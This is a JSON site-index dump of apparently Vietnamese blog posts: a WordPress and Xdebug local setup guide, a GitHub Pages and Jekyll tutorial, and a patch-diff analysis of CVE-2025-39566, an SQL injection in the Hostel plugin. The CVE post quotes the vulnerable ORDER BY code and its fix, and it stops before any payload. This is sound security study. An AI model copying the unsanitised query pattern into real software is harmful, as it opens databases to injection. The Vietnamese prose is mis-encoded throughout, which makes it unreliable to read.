wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- L√†m m·ªõi l·∫°i quy·ªÅn mysql\u0026gt; FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- Tho√°t mysql\u0026gt; quit Bye Kh·ªüi ƒë·ªông l·∫°i d·ªãch v·ª•:\nsudo service mysql start Configure WordPress to connect to the database Copy file c·∫•u h√¨nh m·∫´u:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php WordPress khi t·∫£i v·ªÅ c√≥ s·∫µn file wp-config-sample.php B·∫°n copy n√≥ th√†nh wp-config.php ƒë·ªÉ l√†m file c·∫•u h√¨nh ch√≠nh cho site Ch·ªânh s·ª≠a th√¥ng tin database:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php ƒê√¢y l√† 3 d√≤ng thay th·∫ø text trong file wp-config.php: database_name_here =\u0026gt; wordpress (t√™n DB ƒë√£ t·∫°o ·ªü b∆∞·ªõc tr∆∞·ªõc) username_here =\u0026gt; wordpress (user MySQL ƒë√£ t·∫°o) password_here =\u0026gt; \u0026lt;your-password\u0026gt; (password ƒë√£ set) Khi Apache ch·∫°y WordPress, n√≥ s·∫Ω ƒë·ªçc file n√†y ƒë·ªÉ bi·∫øt d√πng user n√†o + DB n√†o ƒë·ªÉ k·∫øt n·ªëi MySQL Th√™m Secret Keys v√† Salts:\nsudo -u www-data nano /srv/www/wordpress/wp-config.php üëâ ƒê√¢y l√† chu·ªói b√≠ m·∫≠t m√† WordPress d√πng ƒë·ªÉ:\nM√£ h√≥a session cookies Sinh ra token (nonce) ch·ªëng CSRF NgƒÉn ch·∫∑n t·∫•n c√¥ng ki·ªÉu ‚Äúknown secret‚Äù (v√≠ d·ª• k·∫ª t·∫•n c√¥ng ƒëo√°n ƒë∆∞·ª£c secret m·∫∑c ƒë·ªãnh ƒë·ªÉ gi·∫£ m·∫°o login) define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); Thay ƒë·ªïi n√≥ b·∫±ng c√°c chu·ªói random sau: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Truy c·∫≠p http://localhost, ƒë·∫∑t site title, username, password, email cho user admin\nSetup Debug on VSCode ƒê·ªÉ hi·ªÉu ƒë∆∞·ª£c lu·ªìng c·ªßa trang web ch·∫°y v√† x·ª≠ l√≠ ·ªü m·ªói request, ta c·∫ßn ph·∫£i debug n√≥.\nAdd PHP Debug extension on VS Code V√†o Extensions (Ctrl+Shift+X) =\u0026gt; t√¨m PHP Debug (by Felix Becker) =\u0026gt; Install. Extension n√†y k·∫øt n·ªëi v·ªõi Xdebug.\nInstall Xdebug on Ubuntu sudo apt install php-xdebug -y Ki·ªÉm tra c√†i ch∆∞a:\nphp -v N·∫øu c√≥ d√≤ng with Xdebug v3.x.x nghƒ©a l√† ƒë√£ OK.\nConfigure Xdebug sudo nano /etc/php/\u0026lt;version\u0026gt;/apache2/php.ini Th√™m v√†o cu·ªëi file\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port m·∫∑c ƒë·ªãnh m·ªõi c·ªßa Xdebug v3 l√† 9003.\nSau ƒë√≥ restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json M·ªü th∆∞ m·ª•c ch·ª©a trang web wordpress b·∫±ng VSCode\ncode /srv/www/wordpress Trong VS Code =\u0026gt; Run and Debug (Ctrl+Shift+D) =\u0026gt; t·∫°o file launch.json v·ªõi n·ªôi dung:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } pathMappings: √°nh x·∫° th∆∞ m·ª•c trong container/server (/srv/www/wordpress) v·ªÅ th∆∞ m·ª•c local c·ªßa trong VS Code.\nNh∆∞ v·∫≠y l√† ƒë√£ ho√†n th√†nh setup WordPress tr√™n local k·∫øt h·ª£p Debug n√≥ tr√™n VSCode.\nExtend Required Version M·ªói phi√™n b·∫£n WordPress th∆∞·ªùng ƒëi k√®m 1 phi√™n b·∫£n PHP th√≠ch h·ª£p. N√™n ki·ªÉm tra t√≠nh t∆∞∆°ng th√≠ch n√†y ƒë·ªÉ qu√° tr√¨nh setup kh√¥ng b·ªã l·ªói.\nWordPress Auto Update T·ª´ WordPress 3.7 tr·ªü ƒëi (2013), WordPress c√≥ c∆° ch·∫ø t·ª± ƒë·ªông c·∫≠p nh·∫≠t (automatic background updates) cho:\nB·∫£n v√° b·∫£o m·∫≠t (security release). B·∫£n b·∫£o tr√¨ (maintenance release). Kh√¥ng t·ª± ƒë·ªông update major version (tr·ª´ khi b·∫≠t r√µ r√†ng). H·ªá th·ªëng ki·ªÉm tra v·ªõi server api.wordpress.org ƒë·ªÉ xem c√≥ b·∫£n v√° n√†o m·ªõi s·∫Ω t·ª± ƒë·ªông n√¢ng c·∫•p background l√™n. Vi·ªác n√†y di·ªÖn ra r·∫•t nhanh sau khi setup, n√™n b·∫°n th·∫•y code ƒë·ªïi kh√°c so v·ªõi source g·ªëc.\nQu√° tr√¨nh setup di·ªÖn ra khi truy c·∫≠p /wp-admin/install.php\nƒê·ªÉ v√¥ hi·ªáu h√≥a c∆° ch·∫ø c·∫≠p nh·∫≠t t·ª± ƒë·ªông n√†y, th√™m d√≤ng sau v√†o wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); ","permalink":"//localhost:1313/vi/posts/2025-08-21-wordpress-local-and-debugging/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶\u003c/li\u003e\n\u003cli\u003eHi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eC√≥ 2 phi√™n b·∫£n WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"Introduction Khi b·∫Øt ƒë·∫ßu t·∫°o blog c√° nh√¢n, c√≥ ba c√¥ng c·ª• b·∫°n c·∫ßn bi·∫øt: GitHub Pages, Jekyll v√† Giscus.\nGithub Pages: D·ªãch v·ª• mi·ªÖn ph√≠ t·ª´ GitHub, cho ph√©p b·∫°n tri·ªÉn khai website tƒ©nh tr·ª±c ti·∫øp t·ª´ repository. Ch·ªâ c·∫ßn push code l√™n GitHub, blog c·ªßa b·∫°n s·∫Ω t·ª± ƒë·ªông xu·∫•t hi·ªán tr√™n Internet m√† kh√¥ng c·∫ßn server ri√™ng.\nJekyll: M·ªôt static site generator t√≠ch h·ª£p s·∫µn v·ªõi GitHub Pages. Jekyll gi√∫p b·∫°n d·ªÖ d√†ng t·∫°o blog t·ª´ c√°c file Markdown, t·ªï ch·ª©c n·ªôi dung b·∫±ng template v√† theme s·∫µn c√≥.\nGiscus: M·ªôt h·ªá th·ªëng b√¨nh lu·∫≠n hi·ªán ƒë·∫°i d·ª±a tr√™n GitHub Discussions. Thay v√¨ ph·∫£i d√πng d·ªãch v·ª• ngo√†i nh∆∞ Disqus, b·∫°n c√≥ th·ªÉ t·∫≠n d·ª•ng GitHub ƒë·ªÉ qu·∫£n l√Ω comment, v·ª´a g·ªçn nh·∫π v·ª´a th√¢n thi·ªán v·ªõi developer.\nRequirements T√†i kho·∫£n Github Ki·∫øn th·ª©c c∆° b·∫£n v·ªÅ Markdown Creating a Site Repository ·ªû ƒë√¢y, t√¥i s·ª≠ d·ª•ng Chirpy themes, ƒë√¢y l√† theme kh√° n·ªïi ti·∫øng d√†nh cho GitHub Pages, ƒë∆∞·ª£c t·ªëi ∆∞u cho vi·ªác vi·∫øt blog c√° nh√¢n ho·∫∑c technical blog.\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nƒêƒÉng nh·∫≠p v√†o Github v√† di chuy·ªÉn ƒë·∫øn starter Thay v√¨ Fork, ta click Use this template v√† ch·ªçn Create a new repository ƒë·ªÉ t·ª± ƒë·ªông t·∫°o Site Repository. ƒê·∫∑t t√™n cho Repository m·ªõi \u0026lt;username\u0026gt;.github.io, thay ƒë·ªïi \u0026lt;username\u0026gt; th√†nh Github username c·ªßa b·∫°n. Setting up the Environment C√≥ 2 l√Ω do ch√≠nh b·∫°n n√™n setup m√¥i tr∆∞·ªùng tr√™n m√°y local khi ph√°t tri·ªÉn blog:\nSau khi push code l√™n Repository, GitHub Actions s·∫Ω m·∫•t m·ªôt kho·∫£ng th·ªùi gian ƒë·ªÉ ch·∫°y r·ªìi m·ªõi build v√† render ra GitHub Pages. Khi dev tr·ª±c ti·∫øp tr√™n local, b·∫°n c√≥ th·ªÉ quan s√°t k·∫øt qu·∫£ ngay l·∫≠p t·ª©c, nhanh h∆°n v√† thu·∫≠n ti·ªán h∆°n. Using Dev Containers (Recommended for Windows) Dev Containers cung c·∫•p m·ªôt m√¥i tr∆∞·ªùng c√¥ l·∫≠p b·∫±ng Docker, gi√∫p tr√°nh xung ƒë·ªôt v·ªõi h·ªá th·ªëng v√† ƒë·∫£m b·∫£o m·ªçi dependency ƒë·ªÅu ƒë∆∞·ª£c qu·∫£n l√Ω trong container.\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nC√†i ƒë·∫∑t Docker: Tr√™n Windows/macOS: c√†i Docker Desktop. Tr√™n Linux: c√†i Docker Engine. C√†i VS Code v√† extension Dev Containers. Clone repository: N·∫øu d√πng Docker Desktop: m·ªü VS Code v√† clone repo trong container volume. N·∫øu d√πng Docker Engine: clone repo v·ªÅ local, sau ƒë√≥ m·ªü b·∫±ng container trong VS Code. Ch·ªù qu√° tr√¨nh thi·∫øt l·∫≠p Dev Containers ho√†n t·∫•t. Setting up Natively (Recommended for Unix-like OS) V·ªõi c√°c h·ªá ƒëi·ªÅu h√†nh d·∫°ng Unix-like (Linux, macOS), b·∫°n c√≥ th·ªÉ setup m√¥i tr∆∞·ªùng tr·ª±c ti·∫øp (native) ƒë·ªÉ ƒë·∫°t hi·ªáu nƒÉng t·ªët nh·∫•t. Ngo√†i ra, v·∫´n c√≥ th·ªÉ d√πng Dev Containers nh∆∞ m·ªôt l·ª±a ch·ªçn thay th·∫ø.\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nL√†m theo h∆∞·ªõng d·∫´n c√†i ƒë·∫∑t Jekyll v√† ƒë·∫£m b·∫£o ƒë√£ c√†i ƒë·∫∑t Git. Clone repository v·ªÅ m√°y local. N·∫øu b·∫°n fork theme, c√†i Node.js v√† ch·∫°y bash tools/init.sh trong th∆∞ m·ª•c g·ªëc ƒë·ªÉ kh·ªüi t·∫°o repo. Ch·∫°y l·ªánh d∆∞·ªõi ƒë√¢y ·ªü th∆∞ m·ª•c g·ªëc ƒë·ªÉ to√†n b·ªô gem s·∫Ω ƒë∆∞·ª£c c√†i v√†o ./vendor/bundle/ trong project, kh√¥ng c·∫ßn sudo v√† kh√¥ng ƒë·ª•ng g√¨ ƒë·∫øn /var/lib/gems.. bundle config set --local path \u0026#39;vendor/bundle\u0026#39; bundle install Usage Start the Jekyll Server ƒê·ªÉ ch·∫°y site tr√™n local, s·ª≠ d·ª•ng l·ªánh d∆∞·ªõi ƒë√¢y:\nbundle exec jekyll s Configuration M·ªôt s·ªë bi·∫øn c·∫ßn c·∫•u h√¨nh trong _config.yml, bao g·ªìm:\nlang: Set language cho website c·ªßa b·∫°n url: Tr·ªè ƒë·∫øn website c·ªßa b·∫°n title: Title ch√≠nh, n·∫±m d∆∞·ªõi avatar tagline: Subtitle, m√¥ t·∫£ trang web avatar: h·ªó tr·ª£ local v√† CORS resources, c√≥ th·ªÉ s·ª≠ d·ª•ng gif Comment feature via Giscus Ta s·ª≠ d·ª•ng Giscus l√†m h·ªá th·ªëng comment cho website, ngo√†i ra c√≤n c√°c option kh√°c nh∆∞: Disqus, Utterances, t·∫•t c·∫£ ƒë·ªÅu mi·ªÖn ph√≠.\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nC√†i ƒë·∫∑t giscus v√†o Github. V√†o Settings c·ªßa repository ch·ªçn General v√† b·∫≠t Discussions ƒë·ªÉ giscus l∆∞u comments v√†o Discussions. Nh·∫≠p repository \u0026lt;username\u0026gt;/\u0026lt;username\u0026gt;.github.io, th√¥ng b√°o m√†u xanh l√° xu·∫•t hi·ªán khi c√°c ti√™u ch√≠ ·ªü tr√™n ƒë∆∞·ª£c ƒë√°p ·ª©ng. Ch·ªçn th·ªÉ lo·∫°i discussion v√† ch·ªß ƒë·ªÅ cho website. C·∫•u h√¨nh giscus trong _config.yml provider: ch·ªçn giscus giscus: mapping c√°c bi·∫øn t∆∞∆°ng ·ª©ng ƒë√£ l√†m ·ªü giscus v√†o bi·∫øn giscus. Customize the Favicon T·∫°o favicon ri√™ng cho website c·ªßa b·∫°n, kh√¥ng ph·∫£i s·ª≠ d·ª•ng favicon m·∫∑c ƒë·ªãnh c·ªßa themes\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nTruy c·∫≠p Favicon Genarate Click Browse ch·ªçn favicon c·∫ßn t·∫°o, sau ƒë√≥ click Create Favicon ƒë·ªÉ t·∫°o. Click Download the generated favicon ƒë·ªÉ t·∫£i c√°c file ch·ª©a c√°c favicon v·ªÅ. Gi·∫£i n√©n file v·ª´a t·∫£i, x√≥a 2 file d∆∞·ªõi ƒë√¢y: browserconfig.xml site.webmanifest Copy to√†n b·ªô file c√≤n l·∫°i v√† paste v√†o assets/img/favicons(n·∫øu ch∆∞a c√≥ th√¨ t·∫°o). Extends Remove meta tag in Footer C√≥ th·ªÉ x√≥a d√≤ng Using the Chirpy theme for Jekyll. b·∫±ng c√°c b∆∞·ªõc sau:\nT·∫°o file theo ƒë∆∞·ªùng d·∫´n sau _data/locales/en.yml. Copy n·ªôi dung en.yml v√† d√°n v√†o file v·ª´a t·∫°o. S·ª≠a n·ªôi dung bi·∫øn meta th√†nh \u0026quot;\u0026quot; Write a post Tham kh·∫£o rule ƒë·ªÉ vi·∫øt blog c·ªßa themes v√† s·ª≠ d·ª•ng Live Preview ƒë·ªÉ quan s√°t\n","permalink":"//localhost:1313/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eKhi b·∫Øt ƒë·∫ßu t·∫°o blog c√° nh√¢n, c√≥ ba c√¥ng c·ª• b·∫°n c·∫ßn bi·∫øt: GitHub Pages, Jekyll v√† Giscus.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eGithub Pages\u003c/strong\u003e: D·ªãch v·ª• mi·ªÖn ph√≠ t·ª´ GitHub, cho ph√©p b·∫°n tri·ªÉn khai website tƒ©nh tr·ª±c ti·∫øp t·ª´ repository. Ch·ªâ c·∫ßn push code l√™n GitHub, blog c·ªßa b·∫°n s·∫Ω t·ª± ƒë·ªông xu·∫•t hi·ªán tr√™n Internet m√† kh√¥ng c·∫ßn server ri√™ng.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eJekyll\u003c/strong\u003e: M·ªôt static site generator t√≠ch h·ª£p s·∫µn v·ªõi GitHub Pages. Jekyll gi√∫p b·∫°n d·ªÖ d√†ng t·∫°o blog t·ª´ c√°c file Markdown, t·ªï ch·ª©c n·ªôi dung b·∫±ng template v√† theme s·∫µn c√≥.\u003c/p\u003e","title":"Github Pages with Jekyll themes and Giscus"},{"content":"L·ªó h·ªïng trong plugin Hostel tr∆∞·ªõc phi√™n b·∫£n 1.1.5.7. Do vi·ªác l√†m s·∫°ch d·ªØ li·ªáu kh√¥ng ƒë√∫ng c√°ch, ƒëi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6(vul) v√† v1.1.5.7(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis Nguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ GET request v√†o SQL query m√† c∆° ch·∫ø ki·ªÉm so√°t kh√¥ng ch·∫∑t ch·∫Ω.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file controllers/bookings.php\nB·∫£n l·ªó h·ªïng:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } B·∫£n v√°:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } üëâ B·∫£n v√° s·ª≠ d·ª•ng whitelist ƒë·ªÉ gi·ªõi h·∫°n c√°c c·ªôt c√≥ th·ªÉ ƒë∆∞·ª£c s·∫Øp x·∫øp, n·∫øu kh√¥ng h·ª£p l·ªá tr·∫£ v·ªÅ 'tB.id'.\nAnalysis: L·ªó h·ªïng xu·∫•t hi·ªán khi param ob ƒë∆∞·ª£c truy·ªÅn tr·ª±c ti·∫øp v√†o m·ªánh ƒë·ªÅ ORDER BY th√¥ng qua h√†m sanitize_text_field(), ch·ªâ escape m√† kh√¥ng filter SQLi.\nHow it work? ƒê·ªÉ inject ƒë∆∞·ª£c, ta c·∫ßn ph·∫£i x√°c ƒë·ªãnh to√†n b·ªô c√¢u query ƒë∆∞·ª£c ƒë∆∞·ª£c s·ª≠ d·ª•ng ·ªü ƒë√¢y\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); C√¢u query n·∫±m trong nh√°nh default c·ªßa c·∫•u tr√∫c switch.\nTo√†n b·ªô ƒëo·∫°n x·ª≠ l√Ω na·ª≥ thu·ªôc v·ªÅ h√†m static manage() c·ªßa class WPHostelBookings.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } Trong WordPress, plugin giao ti·∫øp v·ªõi core th√¥ng qua Plugin API (Hook System). Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m manage() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a \u0026quot;manage\u0026quot; trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file models/hostel.php ta c√≥ h√†m:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } ·ªû ƒë√¢y:\nadd_menu_page() t·∫°o menu ch√≠nh trong Admin Dashboard. add_submenu_page() th√™m c√°c submenu con cho menu ƒë√≥. Tham s·ªë $callback l√† m·ªôt callback function s·∫Ω ƒë∆∞·ª£c g·ªçi khi ng∆∞·ªùi d√πng click v√†o menu/submenu. V√≠ d·ª•:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() T·∫•t c·∫£ menu/submenu n√†y ƒë·ªÅu ƒë∆∞·ª£c ƒëƒÉng k√Ω b√™n trong h√†m static menu() c·ªßa class WPHostel. Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m menu() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a menu trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file hostel.php ·ªü th∆∞ m·ª•c g·ªëc c·ªßa plugin ta c√≥:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() add_action() l√† m·ªôt Plugin API c·ªßa WordPress, cho ph√©p g·∫Øn m·ªôt callback v√†o m·ªôt action hook. Hook name ·ªü ƒë√¢y l√† admin_menu, nghƒ©a l√† h√†m WPHostel::menu() s·∫Ω ƒë∆∞·ª£c g·ªçi trong v√≤ng ƒë·ªùi khi WordPress d·ª±ng Admin Dashboard Menu. Menu tr√™n UI Admin Dashboard\nDebugging\nCh·ª©c nƒÉng b·ªã l·ªói n·∫±m trong Booking Manager, v√¨ v·∫≠y ta truy c·∫≠p v√†o submenu Manager Bookings tr√™n UI Admin Dashboard. Ngay tr∆∞·ªõc nh√°nh default c√≥ comment // list bookings =\u0026gt; cho th·∫•y ƒëo·∫°n code n√†y x·ª≠ l√Ω vi·ªác li·ªát k√™ v√† s·∫Øp x·∫øp bookings M·ªü debugger: Click Run with Debugger. ƒê·∫∑t breakpoint t·∫°i nh√°nh switch ch·ª©a code l·ªói v√† t·∫°i d√≤ng code g√¢y l·ªói. Khi click v√†o m·ªôt c·ªôt trong b·∫£ng bookings, quan s√°t: Debugger nh·∫£y v√†o c·∫•u tr√∫c switch. D√πng Step Over, debugger ƒëi ti·∫øp v√†o nh√°nh default. Ti·∫øp t·ª•c Step Over v√† theo d√µi gi√° tr·ªã bi·∫øn trong tab Variables \u0026gt; Locals. C√°c bi·∫øn n√†y s·∫Ω k·∫øt h·ª£p ƒë·ªÉ t·∫°o th√†nh c√¢u SQL b√™n d∆∞·ªõi. Sau khi gh√©p c√°c bi·∫øn, c√¢u query ƒë·∫ßy ƒë·ªß c√≥ d·∫°ng:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid 